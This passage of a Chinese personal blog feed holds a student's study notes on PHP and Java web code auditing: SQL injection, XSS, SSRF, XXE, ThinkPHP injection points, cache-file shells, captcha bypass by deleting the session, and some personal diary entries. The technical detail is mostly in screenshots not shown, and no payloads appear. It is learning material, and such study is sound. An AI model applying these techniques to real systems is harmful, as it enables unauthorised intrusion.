href="#jsp" class="headerlink" title="jsp"></a><code>jsp</code></h2><p><code>jsp本质上是一个Servlet   这个怎么理解呢！就是jsp吧！他就是像Servlet一样接收发送请求！最好再返回客户端！它只不过jsp里是包含 html+css+js+java的！</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718100152.png" alt="image-20210718100152573"></p><p>就是 定义–》执行 –&gt;输出</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718100454.png" alt="image-20210718100454697"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718102639.png" alt="image-20210718102639207"></p><p> <img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718102813.png" alt="image-20210718102812976"></p><h3 id="转发和重定向"><a href="#转发和重定向" class="headerlink" title="转发和重定向"></a>转发和重定向</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718102323.png" alt="image-20210718102323783"></p><p><code>转发地址栏 url栏不变！ 重定向url栏变的！重定向是一个新的请求！</code></p><h2 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a><code>SpringBoot</code></h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718105424.png" alt="image-20210718105423942"></p><p>Spring -&gt;&gt; SpringMVC –&gt; SpringBoot</p><p>越来越简化了！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718110717.png" alt="image-20210718110717446"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718112013.png" alt="image-20210718112013239"></p><p><code>ioc</code></p><p><code>https://www.zhihu.com/question/335362570</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718113728.png" alt="image-20210718113728769"></p><p><code>对于Springboot里的注释 是个关键！应该学习学习！</code> </p><p>大概<code>Springboot</code>的思路</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718114714.png" alt="image-20210718114714621"></p><h3 id="java基础"><a href="#java基础" class="headerlink" title="java基础"></a><code>java</code>基础</h3><p>有点晕呀！</p><p>爬回去看了看<code>java</code>基础！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">List指的是集合.&lt;&gt;是泛型,里面指定了这个集合中存放的是什么数据.</span><br><span class="line">比如有一个学生类Student,Student里面包含了学生的一些信息.这样每一个Student对象就代表了一个学生.此时List&lt;Student&gt;就代表这个集合中存放了很多个学生对象,这个集合就像一个班级一样.</span><br></pre></td></tr></table></figure><p><code>https://zhidao.baidu.com/question/173620482.html</code></p><p>太菜了！啊啊啊啊！<code>java</code>好难呀！</p><p>这反射，集合，泛型 又看了看</p><p>这Spring好难懂啊！ Bean是啥啊！ <code>IOc</code>!</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JavaBeans是Java中一种特殊的类，可以将多个对象封装到一个对象（bean）中。特点是可序列化，提供无参构造器，提供getter方法和setter方法访问对象的属性。名称中的“Bean”是用于Java的可重用软件组件的惯用叫法。</span><br></pre></td></tr></table></figure><p>尼玛！这这这 我看的有点懵逼！哈哈哈哈！🙄🙄🙄🙄</p><p><code>这Spring和SpingMVC 和Springboot有点懵逼啊！算了多看看估计就会了！再看看！</code></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a><code>sql</code>注入</h2><p><code>JDBC</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718163105.png" alt="image-20210718163105403"></p><p>预编译就是<code>sql</code>语言不会产生歧义！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718163740.png" alt="image-20210718163740507"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718163947.png" alt="image-20210718163947101"></p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a><code>xss</code></h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718164510.png" alt="image-20210718164510618"></p><p>这个也不多说了！ 就是后端用java写的 熟悉下java的代码！</p><p>Domxss 就是js代码吧前端输入数据再次导入前端页面！没经过后端！没啥用！😑😑😑</p><h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a><code>ssrf</code></h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718170041.png" alt="image-20210718170040952"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718171551.png" alt="image-20210718171551711"></p><p> <img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718171719.png" alt="image-20210718171719732"></p><h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a><code>xxe</code></h2><p>漏洞源码：</p><p><code>https://github.com/c0ny1/xxe-lab</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718210755.png" alt="image-20210718210755443"></p><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>当文件有特殊字符时！  通过外部实体绕过！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718212842.png" alt="image-20210718212842619"></p><p>下面这样不行！ 不能直接拼接！记住！小细节!😁</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718211929.png" alt="image-20210718211929519"></p><p>这样可以！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718212658.png" alt="image-20210718212657914"></p><h3 id="开启web服务"><a href="#开启web服务" class="headerlink" title="开启web服务"></a>开启web服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718220554.png" alt="image-20210718220554284"></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718221851.png" alt="image-20210718221851788"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718222332.png" alt="image-20210718222331913"></p><p>加着两行代码后 它就不能再用file协议了！ 所以就修复了！ 但是把 <code>xxe</code>应该不仅仅是读文件！ 肯定没完全修复！ 肯定还有bug!</p>]]></content>
    
    
    <summary type="html">javaweb代码审计</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>暑假</title>
    <link href="http://upload.love/2021/07/17/%E6%9A%91%E5%81%87-2/"/>
    <id>http://upload.love/2021/07/17/%E6%9A%91%E5%81%87-2/</id>
    <published>2021-07-17T03:21:04.000Z</published>
    <updated>2021-08-01T14:54:45.667Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tp"><a href="#tp" class="headerlink" title="tp"></a>tp</h1><p>学完php没多久 再看看他的框架！ 补习补习！☺☺☺ </p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717112501.png" alt="image-20210717112501223"></p><p>看个浅析MVC模式与三层架构 老走神 不过终于看完了 ！记一下关键点：</p><h2 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h2><p>MVC即 Model-View-Controller，它是一种GUI界面设计的主流模式，主流思想，共分为三层：模型层、视图层、控制层。MVC强制性的使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心部件：模型、视图、控制器。它们各自处理自己的任务。</p><p><strong>M</strong>：模型层，用来实现数据表结构与应用程序实体对象对应、实现业务逻辑处理以及数据库的访问等等。 <strong>可以理解成后端把！</strong> <strong>就是写与数据库响应操作的</strong></p><p><strong>V</strong>：视图层，实现与用户交互的界面，实现数据的输入输出功能。 <strong>前端</strong></p><p><strong>C</strong>：控制层，联系、控制模型层和视图层去完成用户的需求，控制器本身不输出任何东西和做任何处理。它只是接收请求并决定调用哪个模型构件去处理请求，然后再确定用哪个视图来显示返回的数据。</p><p><strong>MVC的工作方式，以实现用户登录为例，首先View层接受用户输入的账号和密码等数据，然后传递给Congtroller层，Controller层调用Model层的业务逻辑处理方法并返回一个结果给Controller层，最后Controller层判断是否登录成功弹出信息或调出登录的界面。</strong></p><p>看完这个应该对MVC项目有个大致的想法了！</p><h2 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h2><p>通常意义上的三层架构就是将整个业务应用划分为：<strong>表现层（UI）</strong>、<strong>业务逻辑层（BLL）</strong>、<strong>数据访问层（DAL）</strong>。区分层次的目的即<strong>为了实现“高内聚，低耦合”</strong>的思想。</p><p>1.表现层（UI）：实现应用程序的界面，从而实现用户进行交互的功能。</p><p>2.业务逻辑层（BLL）：针对具体的业务需求而进行业务逻辑处理，直接对数据访问层进行操作。</p><p>3.数据访问层（DAL）：该层直接对数据库进行操作，对数据进型增删改等。</p><h2 id="二者“生搬硬套”的对应关系"><a href="#二者“生搬硬套”的对应关系" class="headerlink" title="二者“生搬硬套”的对应关系"></a>二者“生搬硬套”的对应关系</h2><p>所谓”生搬硬套“就是二者本没有关系，一个为架构一个为设计模式怎么谈关系。是因为在使用三层架构或N层架构的基础上常会伴有MVC，所以大家总是会认为MVC就是三层架构或三层架构就是MVC，殊不知，它们二者是一起出现的。因此便会产生这种：View层对应三层架构的表现层，Model层对应三层架构的业务逻辑层和数据访问层。</p><p><strong>严格说这三个加起来以后才是三层架构中的UI层</strong>，也就是说，MVC把三层架构中的UI层再度进行了分化，分成了控制器、视图、实体三个部分，控制器完成页面逻辑，通过实体来与界面层完成通话；而C层直接与三层中的业务逻辑层BLL进行对话。</p><h1 id="基本了解"><a href="#基本了解" class="headerlink" title="基本了解"></a>基本了解</h1><p>一般把 学了怎么长时间计算机了！学这种东西一定有他的手册的看看手册！</p><p><code>http://www.thinkphp.cn/</code></p><p>以前以学过一次tp但是 忘了！ 下回忘了直接看手册就好了！</p><p>记录下他的重点：</p><p>模块—》 下有MVC </p><p>先是模块下的MVC</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717122346.png" alt="image-20210717122345957"></p><p>再看看手册里url模式</p><p>晕了！太多了！ 手册里的东西挺多的！ 看了看 MVC 东西挺多的！ 没看完 ！😶真没耐心了！看视频把！</p><h2 id="tp控制器"><a href="#tp控制器" class="headerlink" title="tp控制器"></a>tp控制器</h2><p>哭了 看着框架没啥好写的！看的是一个思路！</p><p>看手册就行了！哈哈哈哈哈！就看个思路！</p><h3 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a>where注入</h3><p>通过map传入是安全的！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717155314.png" alt="image-20210717155314596"></p><h3 id="table注入"><a href="#table注入" class="headerlink" title="table注入"></a>table注入</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717155258.png" alt="image-20210717155258770"></p><h3 id="field注入-字段"><a href="#field注入-字段" class="headerlink" title="field注入 字段"></a>field注入 字段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用M方法实例化</span><br><span class="line">$User &#x3D; M(&#39;User&#39;);</span><br><span class="line">&#x2F;&#x2F; 和用法 $User &#x3D; new \Think\Model(&#39;User&#39;); 等效</span><br><span class="line">&#x2F;&#x2F; 执行其他的数据操作</span><br><span class="line">$User-&gt;select();</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717160956.png" alt="image-20210717160956285"></p><h3 id="alias-join-union"><a href="#alias-join-union" class="headerlink" title="alias|join|union"></a>alias|join|union</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717162625.png" alt="image-20210717162625332"></p><h3 id="order-group-having"><a href="#order-group-having" class="headerlink" title="order|group|having"></a>order|group|having</h3><h3 id="comment"><a href="#comment" class="headerlink" title="comment|"></a>comment|</h3><p>comment 就是 <code>/*adad*/</code></p><h3 id="query-exe"><a href="#query-exe" class="headerlink" title="query|exe"></a>query|exe</h3><p>query用于查询！</p><p>exe用于增删改</p><p>还有什么聚合函数！</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结#"></a>总结#</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">只要sql语言里的参数可控  那就可能存在注入！</span><br></pre></td></tr></table></figure><h3 id="exp表达式"><a href="#exp表达式" class="headerlink" title="exp表达式"></a>exp表达式</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717194405.png" alt="image-20210717194404974"></p><h3 id="Action参数注入"><a href="#Action参数注入" class="headerlink" title="Action参数注入"></a>Action参数注入</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717200517.png" alt="image-20210717200517411"></p><p>那个id参数是可控的！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717200703.png" alt="image-20210717200703764"></p><h3 id="组合注入"><a href="#组合注入" class="headerlink" title="组合注入"></a>组合注入</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717202349.png" alt="image-20210717202349788"></p><h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><p>水平和垂直越权</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717204256.png" alt="image-20210717204256901"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717204329.png" alt="image-20210717204329756"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这时候没有对level过滤 那可能就会存在越权操作！</span><br></pre></td></tr></table></figure><h3 id="模板漏洞"><a href="#模板漏洞" class="headerlink" title="模板漏洞"></a>模板漏洞</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717204935.png" alt="image-20210717204935788"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717205453.png" alt="image-20210717205453210"></p><p>就是相当于 代码写的时候有问题！我们可以输入php代码达到代码执行！</p><h3 id="php标签"><a href="#php标签" class="headerlink" title="php标签"></a>php标签</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717205613.png" alt="image-20210717205613901"></p><h3 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a>缓存漏洞</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717210817.png" alt="image-20210717210817290"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717210729.png" alt="image-20210717210728976"></p><p>就是缓存文件是php，想办法通过缓存文件那shell!</p><h3 id="widget"><a href="#widget" class="headerlink" title="widget"></a>widget</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717210951.png" alt="image-20210717210951899"></p><p>不是很懂！但是看了感觉也就那样！🙄</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>这个 模块把！看了也看了！</p><p>个人感觉吧！ </p><p>怎么说呢！</p><p>就好比！ 数据库里表是 thinkphp_user</p><p>那模板可以有个 <code>User</code>模板   这也就是MVC里说的   M对应的数据库的原因吧！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717194720.png" alt="image-20210717194720206"></p><p>M这里就好比直接调用User表！ 通过实力化User对象！好比直接调用User表！在进行一系列sql操作！</p><h1 id="总结一下把"><a href="#总结一下把" class="headerlink" title="总结一下把"></a>总结一下把</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我感觉挺无聊的！</span><br><span class="line">感觉就是把php 换了种形式！来写代码！可能框架就是这样方便把！ 以前也学过tp！但是我呀！学啥都要好几遍！</span><br><span class="line"></span><br><span class="line">但是感觉漏洞原理都相识！ 只不过框架代码|语法不熟悉！把框架熟悉熟悉还是原来的漏洞！哈哈哈</span><br><span class="line"></span><br><span class="line">其实我学框架也就是想学学他的pop链！学学他的程序流程什么的！ 好像没咋学到！还是要直接看底层，自己调试才行！ </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F7进入  F8跳过</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">感觉必须要直接拿个框架，拿个cms漏洞自己跑一跑 测一测才行！ 观看也其实挺爽的！一操作，就人没了！</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">tp</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>暑假</title>
    <link href="http://upload.love/2021/07/13/%E6%9A%91%E5%81%87-1/"/>
    <id>http://upload.love/2021/07/13/%E6%9A%91%E5%81%87-1/</id>
    <published>2021-07-13T13:51:46.000Z</published>
    <updated>2021-07-17T03:20:40.257Z</updated>
    
    <content type="html"><![CDATA[<p>先记住一句话”一切存在用户输入的地方都有可能存在漏洞”。</p><h1 id="先来看php代码审计吧！"><a href="#先来看php代码审计吧！" class="headerlink" title="先来看php代码审计吧！"></a>先来看php代码审计吧！</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715110925.png" alt="image-20210715110925538"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715200337.png" alt="image-20210715200337194"></p><p>1 直接硬刚！ </p><p>2 直接找关键回溯！  system| eval</p><p>3  根据程序的业务逻辑来审计！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715200733.png" alt="image-20210715200733417"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715200945.png" alt="image-20210715200945029"></p><h2 id="php配置文件"><a href="#php配置文件" class="headerlink" title="php配置文件"></a>php配置文件</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715201147.png" alt="image-20210715201147636"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715201627.png" alt="image-20210715201626880"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715202020.png" alt="image-20210715202020473"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715202511.png" alt="image-20210715202511105"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715203034.png" alt="image-20210715203034733"></p><h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数***"></a>危险函数***</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715203531.png" alt="image-20210715203531722"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715203657.png" alt="image-20210715203657730"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715203728.png" alt="image-20210715203728796"></p><p>上面老师总结的挺全的！😁😁😁</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715204035.png" alt="image-20210715204035135"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715204521.png" alt="image-20210715204520943"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715204845.png" alt="image-20210715204844946"></p><h3 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715205206.png" alt="image-20210715205206757"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715205415.png" alt="image-20210715205415381"></p><p><code>in_arrray</code>是弱比较！😶😑😑  记好了！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715210235.png" alt="image-20210715210235134"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210715211347.png" alt="image-20210715211347760"></p><h2 id="配置phpstorm-xdebug"><a href="#配置phpstorm-xdebug" class="headerlink" title="配置phpstorm+xdebug"></a>配置phpstorm+xdebug</h2><p>这个配置就就算了 不写了！ 网上太多了！现在 都phpstudy都自己带了！</p><p><a href="https://segmentfault.com/q/1010000012452141">php xdebug trace 调试的问题</a></p><p>他这个调试有一个文件！ 可以看整个流程！😁</p><h1 id="top10"><a href="#top10" class="headerlink" title="top10"></a>top10</h1><h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210716072116.png" alt="image-20210716072116658"></p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>把握大局(了解函数功能|知道程序逻辑)+特殊函数定位</p><h3 id="安装漏洞"><a href="#安装漏洞" class="headerlink" title="安装漏洞"></a>安装漏洞</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210716073829.png" alt="image-20210716073829729"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210716080512.png" alt="image-20210716080512609"></p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210716080604.png" alt="image-20210716080604626"></p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>这个漏洞吧！ 我我我不是很会！ 必进js是没咋学过！ 反正有输出的地方就可能有！ 也可能有数据库操作的地方也可能有存储型的xss！</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717093007.png" alt="image-20210717093007246"></p><p>截断现在不咋用了！</p><p>修复漏洞：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717094824.png" alt="image-20210717094824036"></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717095436.png" alt="image-20210717095436812"></p><p>ssrf怎么理解呢 就是 file_get_concents 是可以自己读取 http协议的！</p><p>修复的话！因为他这个是在数据库里更改的！只要限制数据库操作就行！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717102821.png"></p><h3 id="越权操作"><a href="#越权操作" class="headerlink" title="越权操作"></a>越权操作</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717103107.png" alt="image-20210717103106957"></p><h3 id="登录密码爆破"><a href="#登录密码爆破" class="headerlink" title="登录密码爆破"></a>登录密码爆破</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717103929.png" alt="image-20210717103929149"></p><p>np 学到了!</p><p>直接把验证码绕过了！因为验证码和seesion里值做比较！ 所以直接删了session就可以了！</p><p>现在都有知道匹配验证码爆破工具了！ </p><p>修复：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717104832.png" alt="image-20210717104832066"></p><h3 id="截断注入-二次注入"><a href="#截断注入-二次注入" class="headerlink" title="截断注入 二次注入"></a>截断注入 二次注入</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210717104940.png" alt="image-20210717104940820"></p><p>这个嘛！ </p><h1 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">怎么说呢！ </span><br><span class="line"></span><br><span class="line">感觉把 ！就是要多看看项目！cms！ 啥东西看多了！ 就会了！</span><br><span class="line">可能top10，php语言的特性不是很熟悉！ </span><br><span class="line">但慢慢来把！  </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">现在对代码什么的挺感兴趣的！ </span><br><span class="line">学习把 ！ 你现在处于学习截断 ！你感兴趣啥就学啥最好了！</span><br><span class="line">这个暑假要把自己以前找的好视频都刷一般!!!啦啦啦啦！☺☺☺</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Welcome to my blog 😁😁😁😁</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>upload&#39;s 小秘密</title>
    <link href="http://upload.love/2021/07/12/upload-s-%E5%B0%8F%E7%A7%98%E5%AF%86/"/>
    <id>http://upload.love/2021/07/12/upload-s-%E5%B0%8F%E7%A7%98%E5%AF%86/</id>
    <published>2021-07-12T14:19:56.000Z</published>
    <updated>2021-07-13T13:50:30.409Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我这个怪人！好怪啊！！！</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我以前总是想的很多！但慢慢我发现！把握好现在才行！</span><br><span class="line">越想变强，反而越变不强，慢慢的。😀</span><br><span class="line">就发现自己的目标变了好多！人生嘛！尤其是男生！自己最想要的只有自己知道。</span><br><span class="line">我呢？就当遇见那个女孩后！</span><br><span class="line">我喜欢上这个女孩子！那种感觉我也不知道，</span><br><span class="line">怎么说呢！自己变了！变得会照顾人了！ 我以前可是可是笨蛋冷血upload!</span><br><span class="line">妈妈咪的！</span><br><span class="line">怎么就慢慢变变变热了！  说暖还不合适！必进再变也不是暖男！😁</span><br><span class="line">啦啦啦啦！</span><br><span class="line">不知道为什么就是有她在身边的时候，就好开心！</span><br><span class="line">无论干什么，做什么，有她陪着就是挺开心的！</span><br><span class="line">当然，学习可不能拉下，你你你你你是要做好榜样的！</span><br><span class="line">女孩可不会喜欢比自己差劲的男生！</span><br><span class="line">我真的想天天陪着那个小可爱！😁</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当然，自己可不能变弱了！</span><br><span class="line">因为喜欢她是要对人家负责的！</span><br><span class="line">那就对自己狠点吧！ upload!</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">暑假1</span><br><span class="line">暑假2</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Welcome to my blog 😁😁😁😁</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>暑假</title>
    <link href="http://upload.love/2021/07/12/%E6%9A%91%E5%81%87/"/>
    <id>http://upload.love/2021/07/12/%E6%9A%91%E5%81%87/</id>
    <published>2021-07-12T14:16:45.000Z</published>
    <updated>2021-07-14T04:20:01.647Z</updated>
    
    <content type="html"><![CDATA[<p>一天不学习，自己知道；两天不学习，朋友知道；三天不学习，老师知道；一周不学习，考试知道</p><p>看大佬的格言！ 冲压！！！！！！😁😁😁😁😁</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">今天开个头啥也没干 </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">那就定个目标！ 我的方向就行 php和java代码审计！ 学学！</span><br><span class="line">有目标了！ 就学吧 ！冲！！！！！ 😁</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Welcome to my blog 😁😁😁😁</summary>
    
    
    
    
  </entry>
  
</feed>
